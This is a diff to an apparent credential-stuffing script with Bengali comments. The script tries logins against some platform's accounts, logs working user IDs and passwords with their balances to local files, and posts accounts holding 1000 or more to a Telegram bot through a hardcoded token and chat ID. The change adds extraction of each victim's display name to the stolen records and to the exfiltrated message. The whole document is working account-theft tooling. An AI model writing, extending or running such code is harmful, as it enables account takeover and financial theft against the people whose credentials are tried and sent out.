@@ -1,4 +1,3 @@
-
 import os
 import json
 import time
@@ -110,6 +109,14 @@ def attempt_login(user_id, pw):
                 balance = get_balance_deep(data)
                 level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
+                
+                # নাম পাওয়ার চেষ্টা (fullName, name, username, nickName)
+                name_keys = ['fullName', 'name', 'username', 'nickName', 'realName']
+                display_name = uid  # ডিফল্ট হিসেবে ID
+                for key in name_keys:
+                    if key in data and data[key]:
+                        display_name = data[key]
+                        break
 
                 with lock: successful_users.add(user_id)
                 
@@ -122,7 +129,7 @@ def attempt_login(user_id, pw):
                 bal_val = get_balance_value(balance)
                 
                 if bal_val >= 1000:
-                    send_telegram(uid, pw, balance, level)
+                    send_telegram(uid, pw, balance, level, display_name)
                     if bal_val >= 10000: 
                         earn = '100 BDT'
                         color = C
@@ -130,14 +137,15 @@ def attempt_login(user_id, pw):
                         earn = '50 BDT'
                         color = G
 
-                print(f'{BOLD}{color} {CX} | Profile : {status} | Earned : {earn} {D}')
+                # এখন ID এর পরিবর্তে নাম/আইডি দেখাবে
+                print(f'{BOLD}{color} ID: {display_name} | Profile : {status} | Earned : {earn} {D}')
 
                 with open(filename, 'a', encoding='utf-8') as f:
-                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
+                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level} | Name: {display_name}\n')
                     
                 if bal_val > 0:
                     with open('.balances.txt', 'a', encoding='utf-8') as f:
-                        f.write(f'{uid} | {pw} | {balance} | {level}\n')
+                        f.write(f'{uid} | {pw} | {balance} | {level} | {display_name}\n')
 
             elif res.get('status') == 'S0001': 
                 time.sleep(10)
@@ -146,10 +154,10 @@ def attempt_login(user_id, pw):
     except Exception as e:
         pass
 
-def send_telegram(uid, pw, balance, level):
+def send_telegram(uid, pw, balance, level, name):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
-    msg = f'🔥 [CX HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
+    msg = f'🔥 [CX HIT 1000+]\n👤 User: `{uid}`\n📛 Name: {name}\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
     try: 
         requests.post(f'https://api.telegram.org/bot{token}/sendMessage', 
                      json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'},
